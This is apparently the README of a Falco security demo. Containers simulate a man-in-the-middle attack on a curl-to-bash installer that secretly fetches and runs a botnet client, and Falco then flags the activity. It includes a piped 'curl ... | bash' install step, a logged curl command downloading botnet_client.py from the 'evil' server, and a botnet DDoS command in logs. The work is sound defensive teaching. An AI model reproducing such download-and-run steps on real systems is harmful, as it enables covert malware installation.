#Demo of falco with man-in-the-middle attacks on installation scripts

For context, see the corresponding [blog post](http://sysdig.com/blog/making-curl-to-bash-safer) for this demo.

## Demo architecture

### Initial setup

Make sure no prior `botnet_client.py` processes are lying around.

### Start everything using docker-compose

From this directory, run the following:

```
$ docker-compose -f demo.yml up
```

This starts the following containers:
* apache: the legitimate web server, serving files from `.../mitm-sh-installer/web_root`, specifically the file `install-software.sh`.
* nginx: the reverse proxy, configured with the config file `.../mitm-sh-installer/nginx.conf`.
* evil_apache: the "evil" web server, serving files from `.../mitm-sh-installer/evil_web_root`, specifically the file `botnet_client.py`.
* attacker_botnet_master: constantly trying to contact the botnet_client.py process.
* falco: will detect the activities of botnet_client.py.

### Download `install-software.sh`, see botnet client running

Run the following to fetch and execute the installation script,
which also installs the botnet client:

```
$ curl http://localhost/install-software.sh | bash
```

You'll see messages about installing the software. (The script doesn't actually install anything, the messages are just for demonstration purposes).

Now look for all python processes and you'll see the botnet client running. You can also telnet to port 1234:

```
$ ps auxww  | grep python
...
root   19983  0.1  0.4  33992  8832 pts/1    S    13:34   0:00 python ./botnet_client.py

$ telnet localhost 1234
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
```

You'll also see messages in the docker-compose output showing that attacker_botnet_master can reach the client:

```
attacker_botnet_master | Trying to contact compromised machine...
attacker_botnet_master | Waiting for botnet command and control commands...
attacker_botnet_master | Ok, will execute "ddos target=10.2.4.5 duration=3000s rate=5000 m/sec"
attacker_botnet_master | **********Contacted compromised machine, sent botnet commands
```

At this point, kill the botnet_client.py process to clean things up.

### Run installation script again using `fbash`, note falco warnings.

If you run the installation script again:

```
curl http://localhost/install-software.sh | ./fbash
```

In the docker-compose output, you'll see the following falco warnings:

```
falco                  | 23:19:56.528652447: Warning Outbound connection on non-http(s) port by a process in a fbash session (command=curl -so ./botnet_client.py http://localhost:9090/botnet_client.py connection=127.0.0.1:43639->127.0.0.1:9090)
falco                  | 23:19:56.528667589: Warning Outbound connection on non-http(s) port by a process in a fbash session (command=curl -so ./botnet_client.py http://localhost:9090/botnet_client.py connection=)
falco                  | 23:19:56.530758087: Warning Outbound connection on non-http(s) port by a process in a fbash session (command=curl -so ./botnet_client.py http://localhost:9090/botnet_client.py connection=::1:41996->::1:9090)
falco                  | 23:19:56.605318716: Warning Unexpected listen call by a process in a fbash session (command=python ./botnet_client.py)
falco                  | 23:19:56.605323967: Warning Unexpected listen call by a process in a fbash session (command=python ./botnet_client.py)
```
